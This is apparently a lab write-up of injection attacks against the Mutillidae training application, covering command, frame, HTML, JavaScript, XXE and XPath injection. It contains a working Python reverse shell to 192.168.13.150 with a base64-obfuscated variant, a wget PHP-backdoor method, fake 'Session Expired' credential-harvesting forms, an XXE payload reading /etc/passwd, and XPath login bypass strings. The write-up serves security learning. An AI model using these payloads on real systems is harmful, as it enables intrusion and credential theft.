<h1>Other forms of Injection</h1>
<p>
	The purpose of injection remains the same , injecting into an interpreted context for causing the application to perform an unintended functionality.
</p>
<ol>
<li><h2>Command Injection:</h2>
<p> Command injection referes to the attack mechanism in which an attacker can inject any command into the 
underlying OS and compromise the back-end system. Mutillidae for me is hosted on a Linux server, so will be using UNIX commands for the same. Getting shell access on the underlying server system is often the jackpot to any attacker. We can create persistent backdoors with the help of metasploit.
</p>
<ul>
<li>
<h3>Method 1:</h3>
Download a php backdoor via wget using the command injection flaw
And then use that backdoor. 
Catch: /var/www should be writeable
If .htacess is modifiable, we can modify .htacess and make /var/www writeable
</li>
<li><h3>Method 2:Netcat shell</h3>
Use Netcat with <b>"-e"</b> option to allow for command execution after connect.
The -e executes whatever we place in after the parameter. In this case we want to spawn a 
bash shell on tcp connect. 
However, this option is not present on many traditional netcat installations
What to do in this case?
Well we can go for a custom shell in a language of our choice
</li> 
<li><h3>Method 3:Python shell(any language installed on backend)</h3>
Set up a listener on attacker machine
<pre>
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.13.150',1234))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
</pre>
For obfuscation , we could also base64 encode and decode string
<pre>
python -c "exec('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\n4oCYMTkyLjE2OC4xMy4xNTDigJksOTAwMCkpCndoaWxlIDE6ICBwcm9jID0gc3VicHJvY2Vzcy5Q\nb3BlbihzLnJlY3YoMTAyNCksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0\nZGVycj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSk7cy5zZW5kKHByb2Mu\nc3Rkb3V0LnJlYWQoKStwcm9jLnN0ZGVyci5yZWFkKCkp\n'.decode('base64'))"
</pre>
</li>
<li><h3>Method-4: Meterpreter Shell</h3>
Deploying a Meterpreter shell is one way to create a well obfuscated persisitent backdoor to any OS we have shell acess on.How to create and deploy a meterpreter shell is a different and vast topic altogether.
</li>
</ul>
<li><h2>Frame Source injection</h2>
	Similar to a Remote file inclusion vulnerability. We can include any special characters once they  are URL encoded to cause an XSS attack on the site. We can include any iframe of our choice such as a malicious form and then steal user credentials or make cross-domain requests. We could inject a remote page into the src of the iframe. Note that iframes cannot access the cookies of the parent site, however can run arbitary javascript if not run in sandbox mode.
	<p> iframe sources should never be allowed to be controlled by user input, as the iframe can load potential malware from other site. There are other security risks as well. I found this blog very helpful.
	<a href="https://stackoverflow.com/questions/7289139/why-are-iframes-considered-dangerous-and-a-security-risk?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa">Why Iframes pose a security risk?</a>
	We can corrupt the iframe src to load xss attacking page from our server or even an AJAX request to our site. We can inject this to the vulnerable parameter and let the fun unroll, or even a remote html page from the attacking server of our choice. 
	<pre>
		%3Ch1%3ESession+Expired%3C%2Fh1%3E%0D%0A%3Cform+action%3D%22Marale%22%3E%0D%0A%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22password%22%2F%3E%0D%0A%3Cinput+name%3D%22name%22+placeholder%3D%22name%22%2F%3E%0D%0A%3Cinput+type%3D%22submit%22%2F%3E%0D%0A%3C%2Fform%3E%3C%21--
	</pre> 
</li>
<li><h2>HTML Injection </h2>
	When there is a vulnerability in the application which allow you to inject HTML into code.
	This can cause the client to visit a vulnerable "GET" URL and steal Non-http cookies or reveal csrf token to an attacker via an Ajax request. There are a multitude ways this can be exploited.
</br>
	Also, some of these require different contexts , such as those when modifying things such as the HTTP headers, as the victim will not change these to attack himself if the HTML injected is not stored but reflected back. In case of submissions via POST request, the POST requests now can be stored in a clickable link which can be visited via DATA URI.Also, if a site is vulnerable to HTMLi ,it most likely is vulnerable to Javascript Injection as well 
	<ul>
		<li><h3>Basic</h3>
		<p>Simple case, where the input fields visible are vulnerable to HTML injection. You may use any of the web pages, <b>"Add to your Blog"</b> is what I have exploited. Make sure not to use single quotes or else the SQL query will explode</p>
		<pre>
&ltform action="/attacked"&gt
&ltinput name="user"/&gt
&ltinput id='ps' type="password" name="pass"/&gt
&ltbutton type="submit"&gtRegister&lt/button&gt
&lt/form&gt
		</pre>
	</li>
	<li>
		<h3>Via HTTP Headers</h3>
		<p>
			These exploits can work under a man in the middle the attack, or a clever manipulation of the iframe header to load the web page silently in the background. The target page here is DNS lookup page. We must always check the context and filters on the 
			Using Burp intercept the outgoing request. In the DNS lookup page, I am targetting the vulnerability labelled as <b>"Those Back Buttons"</b>.
		</p>
			<p>
				In the beginning , visit this page from another page. As MITM simulation, intercept using Burp, and modify the Referer header to something like this <i>&lt+&gt</i> to see where the payload is getting injected. When the page loads, inspect the backbutton which loads the value from <i>window.href.location</i>. Its value will be like this.
		<pre>
&lta onclick="document.location.href='&lt+&gt';"&gt
		</pre>
		<p>
		So , now knowing the context and the fact that there is no encoding or sanitization defense, we do this.
	</p>
		<pre>
';"&gt&ltform action='hacked'&gt&ltinput type='password' name='password' placeholder='password'/&gt&ltinput name='name' placeholder='name'/&gt&ltinput type='submit'/&gt&lt/form&gt&lt!--
		</pre>
	</p>
	</li>
	<li><h3>Cookie Manipulation</h3>
<p>We do an MITM, and then modify the victim's cookie to be something that causes an HTML injection.
We can inject into the cookies, and if the website reflects some of the cookie, say the time or some user preference such as Nick, we can cause the a reflected injection. However such an attack would most definitely require the context of man in the middle attack or some tricks with iframe.
</p>
</li>
	<li><h3>HTTP Parameter Pollution</h3>
	<p>HTTP parameter pollution is just a method to repeat HTTP parameters and carry out a malicious attack.HTTP standards do not specify how a server should handle repeated parameters. While carrying out an attack, we can use this technique to bypass setting up some IDS, if the repeated parameter value, is concatenated by the backend server to have the desired payload. It is not a standalone attack</p>
	</li> 
<li><h3>DOM Manipulation</h3>
		We manipulate the DOM things such as Web Storage. 
		Web storage provides larger storage than cookies and follows the same origin policies. It can be accessed via javascript, and is a HTML5 w3 standard. What it means is one site cannot modify or access the web storage for other site, if their origin is different.Also, this can be done via Javascript or some malicious browser extension. Secondly, for the injection via WebDOM to work the Web Storage must be reflected somewhere on the page unsanitized. The localstorage object persists until manually removed, and the session storage object is deleted, once the user closes the browser window(It is valid for one session of the browser).
		<br>
		In mutillidae try this overused session expired payload, on the page <b>html5-storage.php</b>.
		<pre>
&gt&ltform action='hacked'&gt&ltinput type='password' name='password' placeholder='password'/&gt&ltinput name='name' placeholder='name'/&gt&ltinput type='submit'/&gt&lt/form&gt&lt!--
		</pre>
	</li>
	</ul>
</li>
<li><h2>Javascript injection</h2>
<p>
	Same technique of exiting the context but instead of the HTML we would be injecting javascript. A Javascript injection attack is also known as XSS. Hre I am going to demonstrate the page of <b>Password Generator</b>. This page has the vulnerability in the field username, which is taken from the URL,and we can inject a javascript code into it. After examining the context, we know that the reflected output is not encoded nor sanitized in anyway. We may perform the injection by the payload mentioned below.
	<pre>
		document.getElementById("idUsernameInput").innerHTML = "This password is for anonymous";document.getElementById("idUsernameInput").innerHTML+='&ltform action="/attacked"&gt
&ltinput name="user"/&gt
&ltinput id="ps" type="password" name="pass"/&gt
&ltbutton type="submit"&gtRegister&lt/button&gt
&lt/form&gt';var x="p";
	</pre>
</p>
<li><h2>Xml Injection</h2>
<ul>
	<li><h3>External Entity Injection</h3>

<p>
	Is harder than most as comments need to be ballanced, and xml parsers very strict with the XML format, unless it is a custom XML parser. The trick is to create an external entity reference and then fetch a local or remote file for nefarious purposes. Remote host file access is blocked by default, and this functionality can also be used for causing a DDOS attack by opening an infinite file stream.
</p>
<p>
	In XML an external entity is like a defined variable, which can referenced in the XML document using the "&" sign. The problem is this variable resolves at the server side, and we can place file URI to exploit this and fetch sensitive server info. We target the page <b>xml-validator.php</b>, and the payload to reveal the passwd file.
	<pre>
		&lt;!DOCTYPE xyz [ &lt;!ENTITY abc SYSTEM &quot;../../../../../etc/passwd&quot;&gt;]&gt;&lt;somemessage&gt;&lt;message&gt;&amp;abc;&lt;/message&gt;&lt;/somemessage&gt;
	</pre>
</p>
</li>
<li><h3>External Entity Expansion</h3>
To exploit this attack , we need to cause a memory overload of the XML parser such that it enters into an array of xml expansions and uses too much memory of ther server. We can do this recursively, and expand upon the tags causing a memory overflow and in some cases stopping the entire web application eventually. 
</li>
</ul>
</li>
<li>
	<h2>Xpath Injection</h2>
	<p>Xpath is a kind of way of querying XML data. There are certain syntactical nuances which one must understand before exploiting Xpath.  On first glance a query violating Xpath or causing Xpath injection appears to be same as the one that triggers the SQL injection. There are certain differences however, in the way that a XPath query is executed. Xpath queries are in a way relative, and often requires information of the parent nodes to mount a meaningful exploit even when the vulnerability is discovered. Mutillidae shows us the executed query, but in real life scenarios, we will be performing blind XPath injection.Mutillidae executes this. We can see because of the middle <b>"and"</b>, we need to inject and set both conditions as true.
		<pre>
//Employee[UserName='a" or 1=1 ' and Password='']
		</pre>
		The payload shall be as follows for <b>both username and password</b> fields.
		<pre>
a' or '1'='1'
		</pre>
	</p>
</li>
</ol>

